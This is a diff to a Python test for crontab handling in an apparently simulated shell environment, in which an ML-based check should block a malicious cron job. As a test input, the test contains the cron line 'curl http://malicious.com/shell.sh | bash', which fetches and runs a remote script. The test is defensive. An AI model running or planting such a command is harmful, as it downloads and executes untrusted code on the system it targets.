@@ -32,9 +32,7 @@ async def test_crontab_advanced_functionality():
     assert emu.pending_input_callback is not None
 
     # 2. Add a clean command (should run)
-    await emu.execute(
-        "* * * * * echo 'Crontab is alive' >> /home/admin/cron_success.log"
-    )
+    await emu.execute("* * * * * echo 'Crontab is alive' >> /home/admin/cron_success.log")
 
     # 3. Add a malicious command (should be blocked by ML)
     await emu.execute("* * * * * curl http://malicious.com/shell.sh | bash")
@@ -53,20 +51,16 @@ async def test_crontab_advanced_functionality():
     await asyncio.sleep(6)
 
     # 7. Check if clean command succeeded
+    # fmt: off
     assert fs.exists("/home/admin/cron_success.log"), (
         "Clean cron job should have executed and created file"
     )
+    # fmt: on
     content = fs.get_content("/home/admin/cron_success.log")
     if isinstance(content, bytes):
         content = content.decode("utf-8")
     assert "Crontab is alive" in content
 
-    # 8. Verify malicious command did NOT run (no wget should happen, though we don't have networking here,
-    # the simulation would have logged or attempted execution if not blocked)
-    # Since our mock blocked it, there should be NO attempted execution.
-
-    # To confirm blocking, we can check if analytics.is_malicious was called for the curl line
-    # (Checking the side_effect was called for 'curl http://malicious.com/shell.sh | bash')
     analytics.is_malicious.assert_any_call("curl http://malicious.com/shell.sh | bash")
 
 
